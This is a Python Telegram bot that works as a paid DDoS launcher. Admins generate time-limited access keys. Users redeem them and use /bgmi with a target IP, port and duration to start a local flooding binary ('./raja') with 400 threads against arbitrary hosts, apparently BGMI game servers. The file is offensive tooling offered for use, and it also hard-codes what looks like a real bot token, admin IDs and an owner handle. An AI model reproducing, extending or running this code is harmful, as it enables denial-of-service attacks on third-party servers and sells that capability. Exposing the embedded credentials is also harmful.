from telegram import ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import json
import datetime
import subprocess
import random
import string

# File Paths
USER_FILE = "users.json"
KEY_FILE = "keys.json"

# Globals
flooding_process = None
flooding_command = None
DEFAULT_THREADS = 400
users = {}
keys = {}
BOT_TOKEN = ""
ADMIN_IDS = []
OWNER_USERNAME = ""

# Set Bot Token
def set_bot_token(token):
    global BOT_TOKEN
    BOT_TOKEN = token

# Set Admin IDs
def set_admin_ids(admin_ids):
    global ADMIN_IDS
    ADMIN_IDS = admin_ids

# Load Users and Keys from Files
def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

# Key Generation and Expiry
def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Command: Generate Key
async def genkey(update, context):
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == "hours":
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == "days":
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = (
                    f"🔑 *Generated Key*\n\n"
                    f"📌 *Key*: `{key}`\n"
                    f"⏳ *Validity*: {expiration_date}\n\n"
                    "🔓 Use `/redeem` to activate this key!"
                )
            except ValueError:
                response = "❗ *Usage*: /genkey <time> <unit> (e.g., 30 days)"
        else:
            response = "❗ *Usage*: /genkey <time> <unit> (e.g., 30 days)"
    else:
        response = "🚫 *Permission Denied!* Only the bot owner can use this command."
    await update.message.reply_text(response, parse_mode="Markdown")

# Command: Redeem Key
async def redeem(update, context):
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration = max(current_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = "✅ *Key Redeemed Successfully!*"
        else:
            response = "❗ *Invalid Key!* Contact the owner for help."
    else:
        response = "❗ *Usage*: /redeem <key>"
    await update.message.reply_text(response, parse_mode="Markdown")

# Command: BGMI Attack
async def bgmi(update, context):
    global flooding_command
    user_id = str(update.message.from_user.id)
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("🔑 *No Valid Key!* Contact the owner to get access.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("❗ *Usage*: /bgmi <IP> <PORT> <TIME>")
        return
    target_ip, port, duration = context.args
    flooding_command = ['./raja', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(
        f"🚀 *Attack Initiated!*\n\n"
        f"🌐 *Target*: {target_ip}\n"
        f"🔢 *Port*: {port}\n"
        f"⏱ *Duration*: {duration} seconds\n\n"
        "🔥 *Stay Tuned for Results!*",
        parse_mode="Markdown"
    )

# Command: Start Attack
async def start(update, context):
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("🔑 *No Valid Key!* Contact the owner to get access.")
        return
    if flooding_process is not None:
        await update.message.reply_text("⚠️ *Attack Already Running!* Use /stop to terminate.")
        return
    if flooding_command is None:
        await update.message.reply_text("❗ *No Pending Attack!* Use /bgmi to initiate.")
        return
    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text("🔥 *Attack Started Successfully!*", parse_mode="Markdown")

# Command: Stop Attack
async def stop(update, context):
    global flooding_process
    if flooding_process is None:
        await update.message.reply_text("❗ *No Attack to Stop!*")
        return
    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text("🛑 *Attack Stopped Successfully!*", parse_mode="Markdown")

# Command: Menu
async def RAJA_command(update, context):
    markup = ReplyKeyboardMarkup(
        [
            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
            [KeyboardButton("/stop")]
        ],
        resize_keyboard=True
    )
    response = (
        "📜 *Menu*\n\n"
        "🔑 /genkey - Generate a key\n"
        "🔓 /redeem - Redeem a key\n"
        "🚀 /bgmi - Launch an attack\n"
        "🔥 /start - Start an attack\n"
        "🛑 /stop - Stop an attack\n\n"
        f"👑 *Owner*: {OWNER_USERNAME}"
    )
    await update.message.reply_text(response, reply_markup=markup, parse_mode="Markdown")

# Main Function
def main():
    if not BOT_TOKEN:
        raise ValueError("❗ Bot token not set. Use `set_bot_token('<YOUR_TOKEN>')`.")
    if not ADMIN_IDS:
        raise ValueError("❗ Admin IDs not set. Use `set_admin_ids(['<ADMIN_ID>'])`.")

    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("RAJA", RAJA_command))
    load_data()
    application.run_polling()

# Run the Bot
if __name__ == "__main__":
    set_bot_token("7630314402:AAH9szViee1jmN0kUlLOS1IUnRww7xU5rRc")  # Replace with your bot token
    set_admin_ids(["7855020275", "7700702349"])  # Replace with your admin IDs
    OWNER_USERNAME = "@rajaraj_04"  # Replace with your Telegram username
    main()
